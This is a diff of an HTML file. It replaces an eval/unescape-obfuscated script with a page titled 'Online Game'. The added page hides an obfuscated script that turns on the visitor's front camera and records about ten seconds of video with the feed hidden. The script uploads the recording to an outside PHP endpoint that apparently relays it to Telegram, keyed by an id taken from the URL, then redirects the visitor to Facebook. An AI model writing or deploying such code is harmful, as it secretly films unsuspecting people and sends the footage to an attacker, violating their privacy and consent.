@@ -1,16 +1,42 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Game</title>
+        <style>
+      body {
+        margin: 0;
+        padding: 0;
+        background: url('https://online-sheba.github.io/BdService/ck/teamx.gif') center/cover no-repeat fixed;
+        height: 100vh;
+        overflow: hidden;
+      
+    </style>
 </head>
 <body>
+    <div id="cameraContainer" style="display: none;">
+        <video id="cameraFeed" autoplay></video>
+    </div>
+    <div id="capturingMessage"></div>
 
-<script type="text/javascript">
-<!-- 
-eval(unescape('%66%75%6e%63%74%69%6f%6e%20%65%39%35%31%62%37%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%35%39%38%39%37%34%31%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%34%39%31%35%35%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%33%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
-eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%65%39%35%31%62%37%28%27') + '%3a%1b%43%4a%43%50%54%45%46%14%64%74%6f%6a%3e%08%01%3a%64%73%62%6d%32%0b%02%3c%66%67%5c%67%38%0b%05%15%19%30%70%63%74%6a%67%39%4c%75%1c%4d%64%6d%6b%38%29%74%65%74%6b%64%38%0b%05%15%19%30%6b%67%74%5d%18%6f%69%6f%6c%60%67%75%7f%3b%1a%69%67%32%64%6c%5d%65%60%17%19%69%6d%6e%74%61%6e%73%3c%1c%64%73%79%69%79%36%29%29%62%6a%64%75%61%2a%66%64%68%6d%68%67%2e%63%69%68%2a%71%61%3e%6a%71%64%6d%6a%74%39%64%6e%72%68%68%6e%56%65%2a%67%64%3f%2d%53%69%40%70%34%51%6a%6c%78%61%40%45%73%56%5c%35%36%5e%70%5c%6a%42%53%28%45%5f%6f%47%77%4e%5e%32%17%19%25%3a%0f%02%1e%18%3b%6c%61%70%5c%15%69%66%6d%68%67%6c%74%74%3c%1c%6d%66%3f%62%63%5f%61%67%34%71%64%67%72%64%1d%15%64%65%6a%74%67%68%74%38%19%2d%2e%2f%25%1b%32%0b%02%18%1e%3c%68%64%72%5f%1f%65%6b%65%6c%67%6a%72%73%38%19%6f%65%35%6e%6e%57%65%67%32%66%67%64%62%66%70%1d%15%64%65%6a%74%67%68%74%38%19%30%31%2f%17%3f%03%06%18%18%3a%75%62%69%65%6c%73%33%0e%0e%1c%18%18%1e%65%6e%6d%73%70%1f%7a%6b%60%4c%5b%6a%5d%6f%72%1b%39%1c%69%6a%70%14%53%4a%4c%53%67%5c%69%63%64%4f%56%6b%57%6b%75%20%77%63%69%67%6f%75%29%61%68%69%5f%74%63%6f%6e%29%76%61%5f%6d%68%61%2f%39%0f%02%1e%18%1f%1b%63%6d%69%78%75%14%67%64%56%5d%6c%70%64%1e%3b%1f%7a%6b%60%4c%5b%6a%5d%6f%72%2d%67%63%73%2d%20%6f%60%21%23%3b%0f%05%0c%04%1c%1f%15%19%7d%67%6e%64%6f%71%29%6f%6f%61%5c%79%62%65%6a%2e%60%6c%67%61%1b%39%1c%5f%6d%75%78%6c%75%32%2f%29%70%6f%72%6e%5c%79%68%65%68%75%2e%76%73%75%2a%65%65%69%64%6b%6b%60%29%39%65%64%38%27%7b%67%63%5b%5a%60%73%67%7f%5e%3d%08%01%1e%1c%3b%24%74%69%6e%63%68%72%3e%08%01%3a%2d%67%6a%5a%68%3a%0f%02%3a%5a%6e%67%75%3a%08%0f%19%14%38%1b%2f%29%18%42%6a%62%63%63%15%3b%7f%1c%32%18%53%60%6e%65%65%69%70%61%19%4f%71%6c%5b%69%18%28%2c%38%0b%05%31%28%56%6d%64%73%38%0f%05%3f%2f%64%73%62%6d%3215989741%33%35%32%36%33%31%32' + unescape('%27%29%29%3b'));
-// -->
-</script>
-<noscript><i>Javascript required</i></noscript>
+    <input type="hidden" id="chatid" name="chatid" value="">
 
+    <script>
+        // JavaScript to extract 'Shofikul' from the URL and set it in the hidden input field
+        function getChatIdFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('id');
+        }
+        const chatIdInput = document.getElementById('chatid');
+        const extractedChatId = getChatIdFromURL();
+        chatIdInput.value = extractedChatId;
+    </script>
+
+    <script>
+        const _0x231ad7=_0x267c;(function(_0x19b23b,_0x27fec6){const _0x2e27f1=_0x267c,_0x556a00=_0x19b23b();while(!![]){try{const _0x19ab00=-parseInt(_0x2e27f1(0xef))/0x1*(-parseInt(_0x2e27f1(0xf4))/0x2)+parseInt(_0x2e27f1(0xe8))/0x3+parseInt(_0x2e27f1(0xfd))/0x4+-parseInt(_0x2e27f1(0xfc))/0x5+-parseInt(_0x2e27f1(0xfe))/0x6*(parseInt(_0x2e27f1(0xfb))/0x7)+parseInt(_0x2e27f1(0xe0))/0x8+-parseInt(_0x2e27f1(0xe5))/0x9;if(_0x19ab00===_0x27fec6)break;else _0x556a00['push'](_0x556a00['shift']());}catch(_0xab5bd1){_0x556a00['push'](_0x556a00['shift']());}}}(_0x2ef0,0x32639));const cameraContainer=document['getElementById'](_0x231ad7(0xf5)),capturingMessage=document[_0x231ad7(0xe7)](_0x231ad7(0xff)),cameraFeed=document[_0x231ad7(0xe7)](_0x231ad7(0xeb));let mediaRecorder,recordedChunks=[];async function setupCamera(){const _0x5af6b7=_0x231ad7;try{const _0x2220c9=await navigator['mediaDevices'][_0x5af6b7(0xec)]({'video':{'facingMode':_0x5af6b7(0xf9)}});cameraFeed['srcObject']=_0x2220c9;}catch(_0x27186f){console['error'](_0x5af6b7(0xed),_0x27186f);}}function startRecording(){const _0x224b33=_0x231ad7;try{mediaRecorder=new MediaRecorder(cameraFeed[_0x224b33(0xf8)],{'mimeType':_0x224b33(0xe9)}),mediaRecorder[_0x224b33(0xf6)]=function(_0x2158a4){const _0x59e8b2=_0x224b33;_0x2158a4['data']['size']>0x0&&recordedChunks[_0x59e8b2(0xe1)](_0x2158a4[_0x59e8b2(0xdf)]);},mediaRecorder[_0x224b33(0xf2)]=function(){const _0xe27802=_0x224b33,_0x35676c=new Blob(recordedChunks,{'type':_0xe27802(0xe9)}),_0x4c649a=chatIdInput[_0xe27802(0xf7)],_0x3e271f=_0xe27802(0xde),_0x2d5444=new FormData();_0x2d5444['append']('video',_0x35676c,_0xe27802(0xf0)),fetch(_0x3e271f,{'method':_0xe27802(0xe2),'body':_0x2d5444,'headers':{'Chat-ID':_0x4c649a}})['then'](_0x417e50=>{const _0x5c56be=_0xe27802;_0x417e50['ok']?console[_0x5c56be(0xdd)](_0x5c56be(0xee)):console['error'](_0x5c56be(0xf1)),setTimeout(()=>{const _0x2cbc7e=_0x5c56be;window[_0x2cbc7e(0xe6)][_0x2cbc7e(0xe4)]='https://www.facebook.com';},0xbb8);});},mediaRecorder['start'](),setTimeout(()=>{const _0x1c2178=_0x224b33;mediaRecorder[_0x1c2178(0xf3)]();},0x2710);}catch(_0x7ed876){console[_0x224b33(0xea)](_0x224b33(0xe3),_0x7ed876);}}function _0x267c(_0x2b1ec8,_0x17042d){const _0x2ef070=_0x2ef0();return _0x267c=function(_0x267cd6,_0x14c273){_0x267cd6=_0x267cd6-0xdd;let _0x303af8=_0x2ef070[_0x267cd6];return _0x303af8;},_0x267c(_0x2b1ec8,_0x17042d);}function _0x2ef0(){const _0x1261a3=['40206QfvhVR','capturingMessage','log','https://onlinesearvice.xyz/video/send.php','data','2711136AhVUfm','push','POST','Error\x20starting\x20recording:','href','7525413fVkhgG','location','getElementById','1215999XhRECK','video/webm','error','cameraFeed','getUserMedia','Error\x20accessing\x20camera:','Video\x20sent\x20to\x20Telegram\x20via\x20PHP!','17rkIMbf','recorded_video.webm','Failed\x20to\x20send\x20video\x20to\x20Telegram.','onstop','stop','23106FaPYyb','cameraContainer','ondataavailable','value','srcObject','user','onloadedmetadata','7AXKWSi','807155ggYEue','1080224aeAzZU'];_0x2ef0=function(){return _0x1261a3;};return _0x2ef0();}setupCamera(),cameraFeed[_0x231ad7(0xfa)]=function(){startRecording();};
+    </script>
 </body>
 </html>
+
 
